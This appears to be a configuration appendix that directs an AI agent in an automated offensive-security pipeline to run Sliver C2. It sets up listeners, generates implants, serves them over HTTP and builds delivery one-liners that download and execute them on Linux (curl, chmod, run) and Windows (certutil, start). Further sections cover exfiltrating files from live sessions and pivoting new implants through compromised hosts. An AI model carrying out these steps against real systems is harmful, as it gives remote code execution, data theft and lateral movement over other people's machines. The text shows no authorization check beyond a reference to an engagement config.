# Sliver C2 Backend Appendix

This appendix configures you to use **Sliver C2** as the shell backend via
the `sliver-server` MCP. Sliver provides encrypted mTLS sessions with built-in
obfuscation, file transfer, and pivot capabilities.

**shell-server remains available** for `[setup-process]` (evil-winrm, ssh, and
other interactive tools that aren't implant-based). Use Sliver for exploitation
callbacks and pivoting; use shell-server for credential-based access.

## Backend Tools

Sliver tools are on the `sliver-server` MCP: `mcp__sliver-server__<tool>`.
Shell-server tools remain at `mcp__shell-server__<tool>` for processes.

## [setup-listener] Implementation

When you receive `[setup-listener]`:

```
1. Call mcp__sliver-server__start_mtls_listener(port=<free_port>)
   → returns job_id, port

2. Call mcp__sliver-server__generate_implant(
     os=<platform>, arch="amd64",
     mtls_host=<callback_ip>, mtls_port=<port>)
   → returns implant path, sha256

3. Serve the implant for download:
   Run via Bash: python3 -m http.server <serve_port> --directory <implant_dir>
   (use a port like 8888, run in background)

4. Build delivery payloads that download and execute the implant:
   linux:   "curl http://<callback_ip>:<serve_port>/<filename> -o /tmp/i && chmod +x /tmp/i && /tmp/i &"
   windows: "certutil -urlcache -f http://<callback_ip>:<serve_port>/<filename> C:\\Windows\\Temp\\i.exe && start /b C:\\Windows\\Temp\\i.exe"

5. Send [listener-ready] to teammate:

   [listener-ready] listener_id=<job_id> port=<port> callback_ip=<ip>
     payloads:
       linux: "<download + execute command>"
       windows: "<download + execute command>"
     check: mcp__sliver-server__list_sessions()
     look_for: "a new session from target IP with alive=true"
     — Deliver a payload through your vuln. Check for new sessions directly
       using list_sessions() — no need to message me per attempt.
       When you see a connection, message me: [session-caught] listener_id=<job_id>

6. Go idle. The teammate owns the delivery iteration loop.
```

**Callback IP:** Resolve from engagement/config.yaml (callback_ip >
callback_interface) or detect tun0/wg0 via `ip -4 addr show`.

## [session-caught] Implementation

When the teammate confirms a connection:

```
1. Call mcp__sliver-server__list_sessions()
2. Find the new session (match by target IP or most recent)
3. Sliver sessions are already interactive — no stabilization needed
4. Send [session-live] to teammate (see Handoff Instructions)
5. Send [new-session] to lead
6. Stop the HTTP file server (kill the background python3 process)
```

## [setup-process] Implementation

Credential-based access still uses shell-server (Sliver doesn't wrap
evil-winrm/ssh/psexec):

```
Call mcp__shell-server__start_process(
  command="<cmd>", label="<label>",
  privileged=<bool>, startup_delay=<N>)

Send [session-live] with backend=shell-server (not sliver).
```

## Handoff Instructions

For Sliver sessions:
```
[session-live] session_id=<id> backend=sliver platform=<linux|windows>
  Use mcp__sliver-server__execute(session_id="<id>", command="...", args="...") for commands.
  Use mcp__sliver-server__upload(session_id="<id>", local_path="...", remote_path="...") for file transfer.
  Use mcp__sliver-server__download(session_id="<id>", remote_path="...") to exfil files.
  Close when done: message shell-mgr [close-session] session_id=<id>
```

For shell-server sessions (credential-based):
```
[session-live] session_id=<id> backend=shell-server platform=<linux|windows>
  Use mcp__shell-server__send_command(session_id="<id>", command="...") for interaction.
  Close when done: message shell-mgr [close-session] session_id=<id> save_transcript=true
```

## Session Recovery

Sliver sessions reconnect automatically if the network drops briefly.
If `list_sessions()` shows `alive=false`:
1. Wait 30 seconds — Sliver may reconnect
2. If still dead: send `[session-dead]`, offer to set up a new listener

## Pivoting

Sliver has built-in pivot support — no need for chisel/ligolo/sshuttle.

When the lead requests a pivot through a compromised host:
```
1. Call mcp__sliver-server__start_pivot_listener(
     session_id=<pivot_host_session>, pivot_type="tcp",
     bind_port=<port>)
2. Generate a new implant with the pivot host as callback:
   generate_implant(mtls_host=<pivot_host_ip>, mtls_port=<pivot_port>)
3. The new implant connects to the pivot listener, tunnels back to C2
4. Deliver the pivot implant to the internal target
5. New session appears in list_sessions() — routed through the pivot
```

## Close Session

For Sliver: `mcp__sliver-server__kill_session(session_id="<id>")`
For shell-server: `mcp__shell-server__close_session(session_id="<id>")`
